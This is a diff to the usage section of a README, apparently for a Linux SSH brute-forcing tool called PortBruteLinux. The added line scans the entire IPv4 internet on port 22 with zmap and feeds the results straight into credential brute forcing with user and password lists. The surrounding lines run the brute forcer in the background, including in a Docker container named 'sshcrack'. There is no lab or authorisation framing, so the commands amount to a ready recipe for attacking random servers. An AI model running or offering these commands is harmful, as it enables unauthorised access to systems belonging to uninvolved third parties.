@@ -39,7 +39,7 @@
 
 ### 开始
 	nohup ./PortBruteLinux -f ssh.txt -p pass.txt -t 300 -u user.txt > PortBruteLinux.log &
-
+	zmap -p 22 0.0.0.0/0 -N 500 -o ssh.txt && sed -i 's/$/:22|SSH/' ssh.txt && ./PortBruteLinux -f ssh.txt -p pass1.txt -t 300 -u user.txt
 	tail -f PortBruteLinux.log
 
 	docker exec -it sshcrack tail -f PortBruteLinux.log
